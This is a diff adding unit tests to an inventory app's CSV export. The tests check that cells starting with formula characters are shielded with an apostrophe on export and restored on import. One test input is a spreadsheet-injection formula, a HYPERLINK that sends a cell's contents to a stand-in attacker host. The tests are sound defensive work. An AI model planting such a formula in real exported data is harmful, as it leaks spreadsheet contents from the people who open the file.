@@ -41,6 +41,46 @@ test("an items export is an items import with no errors; a stock export is a sto
   assert.deepEqual(stock.rows.map((r) => [r.item, r.location, r.quantity]), [["NDR-1", "A-01-1-1", 40], ["Vida", "A-01-1-2", 1200]]);
 });
 
+test("a cell Excel would run as a formula is exported as text", () => {
+  const csv = toCsv([
+    ["name", "unit"],
+    ['=HYPERLINK("https://evil.example/?c="&A1,"Kliko")', "copë"],
+    ["=1+1", "copë"],
+    ["+383 44 123 456", "copë"],
+    ["@sum", "copë"],
+    ["-40C kabllo", "copë"],
+    ["\tskeda", "copë"],
+    ["Çimento 50kg", "copë"],
+  ]);
+  const cells = tokenize(csv.slice(1), ";").map((r) => r.cells[0]);
+
+  // Every formula starter is shielded on the way out...
+  const lines = csv.split("\r\n");
+  assert.equal(lines[2], "'=1+1;copë");
+  assert.equal(lines[3], "'+383 44 123 456;copë");
+  assert.equal(lines[4], "'@sum;copë");
+  assert.equal(lines[5], "'-40C kabllo;copë");
+
+  // ...and taken back off on the way in, so an export still re-imports as
+  // what it was. This is the promise the module comment makes.
+  assert.deepEqual(cells, [
+    "name",
+    '=HYPERLINK("https://evil.example/?c="&A1,"Kliko")',
+    "=1+1",
+    "+383 44 123 456",
+    "@sum",
+    "-40C kabllo",
+    "\tskeda",
+    "Çimento 50kg",
+  ]);
+});
+
+test("an apostrophe that isn't shielding a formula is left alone", () => {
+  const csv = toCsv([["name"], ["'Speciali'"], ["l'artikull"]]);
+  const cells = tokenize(csv.slice(1), ";").map((r) => r.cells[0]);
+  assert.deepEqual(cells, ["name", "'Speciali'", "l'artikull"]);
+});
+
 test("fileSlug strips diacritics and punctuation", () => {
   assert.equal(fileSlug("Fabrika Prizren"), "fabrika-prizren");
   assert.equal(fileSlug("Depo Fushë Kosovë (2)"), "depo-fushe-kosove-2");
